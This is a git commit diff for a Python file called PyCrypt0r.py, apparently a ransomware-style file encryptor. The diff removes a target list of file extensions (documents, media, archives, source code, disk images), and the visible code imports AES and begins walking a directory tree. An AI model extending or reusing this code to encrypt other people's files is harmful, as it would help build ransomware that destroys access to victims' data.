8b95c5724a0a8cd694337060d7ab7c142e9c0707
Aleksey <sidorenkoalekse@mail.ru>
2018-12-07 19:20:18 +0700

    Update PyCrypt0r.py

--- PyCrypt0r.py
+++ PyCrypt0r.py
@@ -4,8 +4,6 @@ import os, random, struct, hashlib
 import SamuraiModule as Samurai
 from Crypto.Cipher import AES
 
-exe = ['exe', 'png', 'mp3', 'mp4', 'jpg', 'jpeg', 'xls', '3ds', '3dm', 'cpp', 'txt', 'asm', 'cmd', 'bat', 'vbs', 'php', 'java', 'wav', 'wmv', 'mpg', 'mpeg', 'avi', 'mov', 'mkv', 'svg', 'psd', 'raw', 'gif', 'bmp', 'iso', 'zip', 'rar', 'tgz', 'tar', 'vdi', 'pdf', 'csv', 'msg', 'ppt', 'pptx', 'html', 'pptm', 'xlc', 'xlm', 'xlt', 'xltm', 'dot', 'docm', 'docx', 'doc', 'dat', 'md', 'list', 'js', 'json', 'git', 'conf', 'rb']
-
 def main(path):
 	os.chdir(str(path))
 	for root, dirs, files in os.walk('.', topdown = False):
